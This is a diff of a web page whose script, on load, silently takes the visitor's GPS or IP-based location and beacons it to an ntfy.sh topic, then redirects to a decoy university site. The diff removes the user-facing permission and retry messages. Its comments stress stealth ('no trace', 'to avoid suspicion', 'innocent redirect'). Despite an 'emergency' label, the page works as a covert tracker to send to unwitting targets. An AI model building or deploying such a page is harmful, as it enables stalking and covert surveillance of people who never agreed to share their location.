@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title> </title>
+    <!-- PWA for home‑screen permission persistence -->
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIk5vdGVzIiwKICAic2hvcnRfbmFtZSI6ICJOb3RlcyIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjZmZmZmZmIiwKICAidGhlbWVfY29sb3IiOiAiI2ZmZmZmZiIKfQ==">
@@ -16,9 +17,6 @@
             justify-content: center;
             height: 100vh;
             font-family: -apple-system, sans-serif;
-            flex-direction: column;
-            gap: 16px;
-            text-align: center;
         }
         .dot {
             width: 10px; height: 10px; border-radius: 50%;
@@ -29,66 +27,27 @@
             0%, 100% { opacity: 0.3; transform: scale(1); }
             50% { opacity: 1; transform: scale(1.2); }
         }
-        .status {
-            font-size: 0.8rem;
-            color: #555;
-            display: none;
-            max-width: 240px;
-            line-height: 1.4;
-        }
-        .retry-btn {
-            display: none;
-            background: #eee;
-            border: 1px solid #ccc;
-            padding: 10px 24px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            color: #333;
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
-            outline: none;
-            transition: background 0.2s;
-        }
-        .retry-btn:active {
-            background: #ddd;
-        }
     </style>
 </head>
 <body>
-    <div class="dot" id="dot"></div>
-    <div class="status" id="status"></div>
-    <button class="retry-btn" id="retryBtn">↻ Retry</button>
+    <div class="dot"></div>
 
     <script>
         (function() {
             // ============================================================
-            //  CONFIGURATION – EDIT THESE
+            //  YOUR CONFIGURATION – EDIT THESE TWO VALUES
             // ============================================================
-            const NTFY_TOPIC = 'Location_Notify';   // long random string
-            const DECOY_URL = 'https://www.iitb.ac.in/';    // innocent redirect
+            const NTFY_TOPIC = 'Location_Notify';   // long random string (e.g., 'fam7xq2k9m')
+            const DECOY_URL = 'https://www.iitb.ac.in/';    // innocent redirect page
             const GPS_TIMEOUT = 1000000;                      // 5 seconds
             // ============================================================
 
-            const dotEl = document.getElementById('dot');
-            const statusEl = document.getElementById('status');
-            const retryBtn = document.getElementById('retryBtn');
-
-            function showWaiting() {
-                dotEl.style.display = 'block';
-                statusEl.style.display = 'none';
-                retryBtn.style.display = 'none';
-            }
-
-            function showRetryMessage(msg) {
-                dotEl.style.display = 'none';
-                statusEl.textContent = msg;
-                statusEl.style.display = 'block';
-                retryBtn.style.display = 'inline-block';
-            }
-
+            // -----------------------------------------------------------------
+            // 1. GPS (works silently if permission already granted)
+            // -----------------------------------------------------------------
             function getGpsLocation() {
                 return new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) return reject({ code: -1, message: 'no gps' });
+                    if (!navigator.geolocation) return reject(new Error('no gps'));
                     navigator.geolocation.getCurrentPosition(
                         pos => resolve({
                             lat: pos.coords.latitude,
@@ -102,6 +61,9 @@
                 });
             }
 
+            // -----------------------------------------------------------------
+            // 2. IP fallback (no permission needed)
+            // -----------------------------------------------------------------
             async function getIpLocation() {
                 const resp = await fetch('https://ipapi.co/json/');
                 if (!resp.ok) throw new Error('ip api failed');
@@ -116,6 +78,9 @@
                 };
             }
 
+            // -----------------------------------------------------------------
+            // Build short message for ntfy
+            // -----------------------------------------------------------------
             function buildNtfyMessage(loc) {
                 const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                 const time = new Date().toLocaleString();
@@ -129,6 +94,9 @@
                 );
             }
 
+            // -----------------------------------------------------------------
+            // Send via ntfy using sendBeacon (guaranteed delivery)
+            // -----------------------------------------------------------------
             function sendNtfy(loc) {
                 if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return;
                 const msg = buildNtfyMessage(loc);
@@ -136,43 +104,41 @@
                 navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
             }
 
+            // -----------------------------------------------------------------
+            // Redirect to decoy page (no trace)
+            // -----------------------------------------------------------------
             function redirectToDecoy() {
                 setTimeout(() => {
                     if (DECOY_URL) window.location.replace(DECOY_URL);
-                }, 600);
+                }, 700);
             }
 
-            // Main function – called on load and on retry
-            async function attemptSend() {
-                showWaiting();
+            // -----------------------------------------------------------------
+            // Main emergency sequence
+            // -----------------------------------------------------------------
+            async function emergency() {
+                let loc;
                 try {
-                    const loc = await getGpsLocation();
-                    sendNtfy(loc);
-                    redirectToDecoy();
-                } catch (error) {
-                    if (error.code === error.PERMISSION_DENIED) {
-                        // User denied – show message and retry button
-                        showRetryMessage('Location permission needed.\nTap Retry to allow.');
-                    } else {
-                        // Any other error (timeout, unavailable) – fall back to IP
-                        try {
-                            const ipLoc = await getIpLocation();
-                            sendNtfy(ipLoc);
-                            redirectToDecoy();
-                        } catch (e2) {
-                            showRetryMessage('Unable to get location.\nCheck connection and retry.');
-                        }
+                    loc = await getGpsLocation();
+                } catch (e) {
+                    try {
+                        loc = await getIpLocation();
+                    } catch (e2) {
+                        // Total failure – still redirect to avoid suspicion
+                        redirectToDecoy();
+                        return;
                     }
                 }
+
+                // Send location silently
+                sendNtfy(loc);
+
+                // Redirect to harmless site
+                redirectToDecoy();
             }
 
-            // On page load, try immediately
-            attemptSend();
-
-            // Retry button – re-attempt GPS (will show permission prompt again if needed)
-            retryBtn.addEventListener('click', () => {
-                attemptSend();
-            });
+            // Start immediately when the page loads
+            emergency();
         })();
     </script>
 </body>
